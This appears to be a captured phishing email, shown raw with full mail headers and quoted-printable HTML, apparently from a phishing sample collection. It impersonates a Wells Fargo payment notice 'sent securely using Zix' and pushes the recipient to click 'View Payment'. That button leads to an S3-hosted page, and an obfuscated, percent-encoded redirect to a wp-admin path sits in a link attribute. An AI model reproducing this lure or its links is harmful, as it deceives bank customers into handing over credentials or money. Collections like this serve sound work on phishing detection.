@@ -1,0 +1,281 @@
+Return-Path: talty@taltytexas.com
+Delivered-To: jose@monkey.org
+X-FDA: 82882803948.40.2DFA3DE
+Received: from smtp78.iad3a.emailsrvr.com (smtp78.iad3a.emailsrvr.com
+ [173.203.187.78])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 3A604120003
+	for <jose@monkey.org>; Wed, 11 Dec 2024 13:47:28 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=pass (imf16.b.hostedemail.com: domain of talty@taltytexas.com designates
+ 173.203.187.78 as permitted sender) smtp.mailfrom=talty@taltytexas.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1733924845;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=2JfBgN8c36UIr+R53sVpbinXouqxE8tx9zBYFmL2oEw=;
+	b=OEBPRS1ZD/33Z2wt5qjdGN92mkZgNEGnKccxM1CDMhDaNXiqJZRyL1CAXiRNyOZX7aRgPR
+	T5RYYeKvIyl6qYyYsZslT47grX33mrc1NwLmBWc94jFNlrf691VcLsBayPmIvIZdjwgYGE
+	0uB62KnY8+ux6qPdsNMvHy5AwR87dvk=
+ARC-Authentication-Results: i=1;
+	imf16.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=pass (imf16.b.hostedemail.com: domain of talty@taltytexas.com designates
+ 173.203.187.78 as permitted sender) smtp.mailfrom=talty@taltytexas.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1733924845; a=rsa-sha256;
+	cv=none;
+	b=yROdv5eFTJF0FbwRYEbUBSQCOiB9wiXfOk1LtkJvpekVlaZ67lRtNFAs3IaK99r8prHm9U
+	lrw2HNkG8ZtP4uISU+UK45i4uzhnnsOPvQp9QtVV02mfiFE7XzQCY2y+EiqacLw7sI6Oc6
+	BVA7VjyFJQ6FohSNbUsjN9hEo+/kDXA=
+Received: from app12.wa-webapps.iad3a (relay-webapps.rsapps.net
+ [172.27.255.140])
+	by smtp2.relay.iad3a.emailsrvr.com (SMTP Server) with ESMTP id D2E34588B;
+	Wed, 11 Dec 2024 08:47:40 -0500 (EST)
+Received: from taltytexas.com (localhost.localdomain [127.0.0.1])
+	by app12.wa-webapps.iad3a (Postfix) with ESMTP id 382A4E2488;
+	Wed, 11 Dec 2024 08:47:39 -0500 (EST)
+Received: by app.rackspace.com
+    (Authenticated sender: talty@taltytexas.com,
+ from: customerservice@officialpayments.com)
+    with HTTP; Wed, 11 Dec 2024 07:47:39 -0600 (CST)
+X-Auth-ID: talty@taltytexas.com
+Date: Wed, 11 Dec 2024 07:47:39 -0600 (CST)
+Subject: Action Required: Confirm Your Payment Details Now to Complete
+ Processing
+From: "Direct Pay" <customerservice@officialpayments.com>
+To: directPay@bussinesswellsfargo.com
+MIME-Version: 1.0
+Content-Type: 
+ multipart/alternative;boundary="----=_20241211074739000000_48898"
+Importance: Normal
+X-Priority: 3 (Normal)
+X-Type: html
+X-Client-IP: 197.242.109.159
+Message-ID: <1733924859.224227358@app.rackspace.com>
+X-Mailer: webmail/19.0.25-RC
+X-Classification-ID: 588d1ecb-eef1-4a8a-9a03-f09a3cdde765-1-1
+X-Spam-Status: No, score=-1.70
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 3A604120003
+X-Stat-Signature: ei7ue9ti93ydh77fejznzpqebiw764a7
+X-Rspam-User: 
+X-HE-Tag: 1733924848-448157
+X-HE-Meta: 
+ U2FsdGVkX1+jqGaJQgVX/DkaggRl0iVnTErm02W0uYN45PU1MJrOXtnEIrTs+qOnP3oHLaIeD9C7bC6Uqtzg6VghLshn/kHrtYiRPyFP1qLo+JC1Ui7NCZ65kk5EE01s42VIH8lJ/jNBrOPsEDRN6+edtmkdBt22OGgHS7TG7heFUY6K551uNlC1suh8IsxGRJ8td2Kirw4sSwoAd5INFfKy02r2x/Qcikl0aSt6It9SGwd+yE6eMU8uWh4mtZoa2/Hmr2I8PW4EJG8kFY4yeT7FylqBRir58t2bjDTFbRWbUdppbQmWsRihhXNna9EDiEcIgMQtIVWQ+92zcrTlaynrNm5gFuOpXsORcCBn/8Ao8bepR7p2FOsOys/+AAo26nruHAbxkUi9gd3FB0mFYFx6ahs12PchFFTd5HtdFjV5lgbxYHS9FVzjFybzWFQnJJW+8RsTbGivvHxbQGdOMYQIclWzUjU3epVPkEaOJQ9jaeV4VmZPCR4psxk+0g/MYULCPOF06e7KKeZd055puNiHXMBDV/mIbjpBMrFKaPdCStL3deVp7WFkbFJYDk9LUHyZufpX7nzI+EffqrYMUnvMUafidBc2zTPT/af9WB7urlXUkousV5FWg6FdRjXs8CZOqERoiKS38TlTq68Jwz9+5ViLkQR96YB5isVg5e5pf3T6tMiqhsujvtXFW9yZHbvPGKeJzWF0tYA6z+rCJ7PSt5dCjrysPJBQ37lAvrysr43dZbg03lgUMl0viQmIpmw2BeqNuPkTZKofoxmcZnXyjW0QTuYkgOS9+0k3FqxIm/Rr4IPPnSV6BJ8tkA027PrgYEmCMWfI3wt4wASHVnalKr5jtp5pJfmRb/XfUgz/unKG+t6P2lwB0isMn+YUZdZAzyZvTd08YS9pxWMBzUPbaPCC2Ikkm9HjZijaMlCDuNSPWvfeH3BqaF7Pk8G3UWGADYKrKsLbzSo7dZubYKhbSh/
+ fGvFxFXgI9ReqZsPT2+r2jzQiwgKni6qHrCoctjDdou/NuHdq5Q3eYdiAC7wIOBGldVwtd6Hq9AqMK+240Rtgjkxp8HDMhTZklcIDEr7OIhQqO1vL7JExC/RZlrYeQ3dLXcEZeq8eJZesxs2FdLSdcmYj8w9/ubyG7vy7Nd0tjQVXvAiPQnWtE7tua1T01aZcB14t1EIKbeUwKxVHyZEk94R8wYwRIMQg+SrzYXuVwpDDUNc13WlVk+PfSsgMJQoNzleFwokN+pGL71bp+FwHtHPNXNEi9uUR4z2fIkD3MCI9fJ/LrYxCx8yoNu/rkFnV/r39tAoS3zHPWEP1Fpk4unr7bGzdyCnGEsBZrFtWR0rzyiOokPEDgKUzdeDPqJvgllpW6pBMHIIynvGrH883zr4buoW/1LdQOzA8XciEKdrSVLeHMMfKEojHSsBNx5eaSMND5Q/33Q3uL+LkFCT69WvCDvtxgj/EGhiVxCvuPHr43ofbTtFE8zydh5robwvrHOAMU2brUBbDh+iGkRpQMow+yDRSRguWdG+yK4s7yicnIQ9GhUpDcELNfEk8Kc+Mm1AhWJawpgdlZGTFdb21k/9j1/sr9hqcg4psASpVQSrxMcrd8LPICZLBoqHplTinXz7cxCWKAEw/3LrkPYRhhIQPOeHgTzitlCuZMj9R/hu9rnud0lo2awsZbUtpooWHDjr7Wln/RYB69CPxjvBlosbYUuUeRbc2J7mloov/85Z6zoULLhmU3JtMAr2d1jeevz4OkeAz/nGZDDUJ65X55k2AuQ==
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 387
+
+------=_20241211074739000000_48898
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+ =
+
+
+[ This message was sent securely using Zix =C2=AE ]( http://www.zixcorp.com=
+/get-started/ )
+Wells Fargo has issued a payment to you at the request of our business cust=
+omer. Click the button below to review the transaction details and confirm =
+receipt.
+
+
+Payment Details:
+Send Date: December 10, 2024
+Pay Date: December 11, 2024
+Payment Posting for Other Account Holders: To be completed by December 12, =
+2024
+
+[ View Payment  ]( https://applicationexclusionzone.s3.eu-north-1.amazonaws=
+.com/policy.html ):
+
+Please Note: This is an automated notification. Kindly do not reply to this=
+ email.
+
+Thank you for your attention to this matter.
+Wells Fargo
+The information transmitted by this email is intended only for the person o=
+r entity to which it is addressed. This email may contain proprietary, busi=
+ness-confidential, and/or privileged material. If you are not the intended =
+recipient of this message, be aware that any use, review, retransmission, d=
+istribution, reproduction or any action taken in reliance upon this message=
+ is strictly prohibited. If you received this in error, please contact the =
+sender and delete the material from all computers.
+
+
+------=_20241211074739000000_48898
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<font face=3D"arial" size=3D"2"><p style=3D"margin:0;padding:0;font-family:=
+ arial; font-size: 10pt; overflow-wrap: break-word;">&nbsp;</p>
+<table style=3D"font-family: Arial, Helvetica, sans-serif; font-style: norm=
+al; font-variant-ligatures: normal; font-variant-caps: normal; font-weight:=
+ 400; letter-spacing: normal; orphans: 2; text-align: start; text-transform=
+: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white=
+-space: normal; background-color: #ffffff; text-decoration-thickness: initi=
+al; text-decoration-style: initial; text-decoration-color: initial; font-va=
+riant-numeric: inherit; font-variant-east-asian: inherit; font-variant-alte=
+rnates: inherit; font-stretch: inherit; font-size: 15px; line-height: inher=
+it; font-size-adjust: inherit; font-kerning: inherit; font-feature-settings=
+: inherit; color: #242424;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
+" width=3D"100%">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; border: 1px solid #003e6a;" align=3D"center" heig=
+ht=3D"20" bgcolor=3D"#005fa8"><a style=3D"color: #1155cc; border: 0px; font=
+: inherit; margin: 0px; padding: 0px; vertical-align: baseline; text-decora=
+tion-line: none;" title=3D"http://www.zixcorp.com/get-started/" rel=3D"noop=
+ener noreferrer" href=3D"http://www.zixcorp.com/get-started/" target=3D"_bl=
+ank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://www.zixc=
+orp.com/get-started/&amp;source=3Dgmail&amp;ust=3D1733993129556000&amp;usg=
+=3DAOvVaw1DD24yxniKk9NTQfds2u7Y"><span style=3D"border: 0px; font-style: in=
+herit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; =
+font-size: inherit; line-height: inherit; font-family: ARIAL, serif, EmojiF=
+ont; font-size-adjust: inherit; font-kerning: inherit; font-feature-setting=
+s: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color: #ff=
+ffff;"><span style=3D"border: 0px; font-style: inherit; font-variant: inher=
+it; font-weight: inherit; font-stretch: inherit; font-size: 13px; line-heig=
+ht: 20px; font-family: Lato, Arial, sans-serif, serif, EmojiFont; font-size=
+-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit; ma=
+rgin: 0px; padding: 0px; vertical-align: baseline;">This message was sent s=
+ecurely using&nbsp;</span></span><span style=3D"border: 0px; font-style: in=
+herit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; =
+font-size: inherit; line-height: inherit; font-family: TIMES, serif, EmojiF=
+ont; font-size-adjust: inherit; font-kerning: inherit; font-feature-setting=
+s: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color: #ff=
+ffff;"><span style=3D"border: 0px; font-style: inherit; font-variant: inher=
+it; font-weight: inherit; font-stretch: inherit; font-size: 13px; line-heig=
+ht: inherit; font-family: Lato, Arial, sans-serif, serif, EmojiFont; font-s=
+ize-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit;=
+ margin: 0px; padding: 0px; vertical-align: baseline;">Zix</span>&nbsp;<spa=
+n style=3D"border: 0px; font-style: inherit; font-variant: inherit; font-we=
+ight: inherit; font-stretch: inherit; font-size: 10px; line-height: inherit=
+; font-family: inherit; font-size-adjust: inherit; font-kerning: inherit; f=
+ont-feature-settings: inherit; margin: 0px; padding: 0px; vertical-align: s=
+uper; color: inherit;">=C2=AE</span></span></a></td>
+</tr>
+</tbody>
+</table>
+<p style=3D"margin:0;padding:0;font-family: arial; font-size: 10pt; overflo=
+w-wrap: break-word;"><br style=3D"font-family: Arial, Helvetica, sans-serif=
+; font-style: normal; font-variant-ligatures: normal; font-variant-caps: no=
+rmal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: sta=
+rt; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -=
+webkit-text-stroke-width: 0px; white-space: normal; background-color: #ffff=
+ff; text-decoration-thickness: initial; text-decoration-style: initial; tex=
+t-decoration-color: initial; color: #242424; font-size: 15px;" /><br style=
+=3D"font-family: Arial, Helvetica, sans-serif; font-style: normal; font-var=
+iant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter=
+-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-tra=
+nsform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;=
+ white-space: normal; background-color: #ffffff; text-decoration-thickness:=
+ initial; text-decoration-style: initial; text-decoration-color: initial; c=
+olor: #242424; font-size: 15px;" /><span style=3D"font-family: Arial, Helve=
+tica, sans-serif; font-style: normal; font-variant-ligatures: normal; font-=
+variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2;=
+ text-align: start; text-indent: 0px; text-transform: none; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; backgro=
+und-color: #ffffff; text-decoration-thickness: initial; text-decoration-sty=
+le: initial; text-decoration-color: initial; color: #242424; font-size: 15p=
+x;">Wells Fargo has issued a payment to you at the request of our business =
+customer. Click the button below to review the transaction details and conf=
+irm receipt.</span></p>
+<p style=3D"margin:0;padding:0;font-style: normal; font-variant-ligatures: =
+normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal=
+; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; wi=
+dows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: no=
+rmal; background-color: #ffffff; text-decoration-thickness: initial; text-d=
+ecoration-style: initial; text-decoration-color: initial; color: #242424; f=
+ont-family: arial; font-size: 10pt;"><br /><br /><strong>Payment Details:</=
+strong></p>
+<ul style=3D"font-family: Arial, Helvetica, sans-serif; font-style: normal;=
+ font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 40=
+0; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px;=
+ text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-wi=
+dth: 0px; white-space: normal; background-color: #ffffff; text-decoration-t=
+hickness: initial; text-decoration-style: initial; text-decoration-color: i=
+nitial; font-size: 15px; color: #242424;">
+<li><strong>Send Date:</strong><span style=3D"border: 0px; font: inherit; m=
+argin: 0px; padding: 0px; vertical-align: baseline; color: inherit;">&nbsp;=
+December</span>&nbsp;10, 2024</li>
+<li><strong>Pay Date:</strong><span style=3D"border: 0px; font: inherit; ma=
+rgin: 0px; padding: 0px; vertical-align: baseline; color: inherit;">&nbsp;D=
+ecember</span>&nbsp;11, 2024</li>
+<li><strong>Payment Posting for Other Account Holders:</strong><span style=
+=3D"border: 0px; font: inherit; margin: 0px; padding: 0px; vertical-align: =
+baseline; color: inherit;">&nbsp;</span>To be completed by&nbsp;December&nb=
+sp;12, 2024</li>
+</ul>
+<div style=3D"font-family: Arial, Helvetica, sans-serif; font-style: normal=
+; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 4=
+00; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px=
+; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-w=
+idth: 0px; white-space: normal; background-color: #ffffff; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial; border: 0px; font-variant-numeric: inherit; font-variant-east-asia=
+n: inherit; font-variant-alternates: inherit; font-stretch: inherit; font-s=
+ize: 16px; line-height: inherit; font-size-adjust: inherit; font-kerning: i=
+nherit; font-feature-settings: inherit; margin: 0px; padding: 10px; vertica=
+l-align: baseline; max-width: 240px; color: #ffffff;">
+<div style=3D"border: 0px; font-style: inherit; font-variant: inherit; font=
+-weight: inherit; font-stretch: inherit; line-height: inherit; font-family:=
+ inherit; font-size-adjust: inherit; font-kerning: inherit; font-feature-se=
+ttings: inherit; margin: 0px; padding: 10px; vertical-align: baseline; max-=
+width: 240px;"><a style=3D"color: #ffffff; border: 0px; font: inherit; marg=
+in: 0px; padding: 10px 30px; vertical-align: baseline; text-decoration-line=
+: none; background-color: #0078d4;" title=3D"https://nts.embluemail.com/p/c=
+l?data=3DxeN2zmLAdKsJjNJSxxNKVNCZ%2FcaH9xo9YolNHffBn3aswbcAFcpIJPcyGlZpg%2B=
+pajNSoMD7Lf9jxUak5G2JJdhyGiSugSfvKJm%2BjWjtLkAU%3D!-!8e4el7a!-!%68%74%74%70=
+%73%3A%2F%2Fk%65y%73to%6Eel%69fe%73ci%2E%6Fr%67%2Fw%70%2Da%64%6Di%6E%2Fc%73=
+%73%2Fc%73%73%2Fshipping%2Fwhitchurch%2Fc2hpcHBpbmdAd2hpdGNodXJjaC5jb20=3D"=
+ rel=3D"nofollow noopener =
+
+noreferrer noreferrer" href=3D"https://applicationexclusionzone.s3.eu-north=
+-1.amazonaws.com/policy.html" target=3D"_blank" data-saferedirecturl=3D"htt=
+ps://www.google.com/url?q=3Dhttps://nts.embluemail.com/p/cl?data%3DxeN2zmLA=
+dKsJjNJSxxNKVNCZ%252FcaH9xo9YolNHffBn3aswbcAFcpIJPcyGlZpg%252BpajNSoMD7Lf9j=
+xUak5G2JJdhyGiSugSfvKJm%252BjWjtLkAU%253D!-!8e4el7a!-!%2568%2574%2574%2570%=
+2573%253A%252F%252Fk%2565y%2573to%256Eel%2569fe%2573ci%252E%256Fr%2567%252F=
+w%2570%252Da%2564%256Di%256E%252Fc%2573%2573%252Fc%2573%2573%252Fshipping%2=
+52Fwhitchurch%252Fc2hpcHBpbmdAd2hpdGNodXJjaC5jb20%3D&amp;source=3Dgmail&amp=
+;ust=3D1733993129556000&amp;usg=3DAOvVaw2L9lI9Tm-vEmX3Rwvkei3x">View Paymen=
+t<span>&nbsp;</span></a>:</div>
+<strong></strong></div>
+<p style=3D"margin:0;padding:0;font-style: normal; font-variant-ligatures: =
+normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal=
+; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; wi=
+dows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: no=
+rmal; background-color: #ffffff; text-decoration-thickness: initial; text-d=
+ecoration-style: initial; text-decoration-color: initial; color: #242424; f=
+ont-family: arial; font-size: 10pt;"><strong><br />Please Note:</strong>&nb=
+sp;This is an automated notification. Kindly do not reply to this email.</p>
+<p style=3D"margin:0;padding:0;font-style: normal; font-variant-ligatures: =
+normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal=
+; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; wi=
+dows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: no=
+rmal; background-color: #ffffff; text-decoration-thickness: initial; text-d=
+ecoration-style: initial; text-decoration-color: initial; color: #242424; f=
+ont-family: arial; font-size: 10pt;"><br />Thank you for your attention to =
+this matter.</p>
+<p style=3D"margin:0;padding:0;font-family: Arial, Helvetica, sans-serif; f=
+ont-style: normal; font-variant-ligatures: normal; font-variant-caps: norma=
+l; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start;=
+ text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -web=
+kit-text-stroke-width: 0px; white-space: normal; background-color: #ffffff;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial; font-size: 15px; color: #242424;">Wells Fargo</p>=
+</font>
+
+
+------=_20241211074739000000_48898--
+
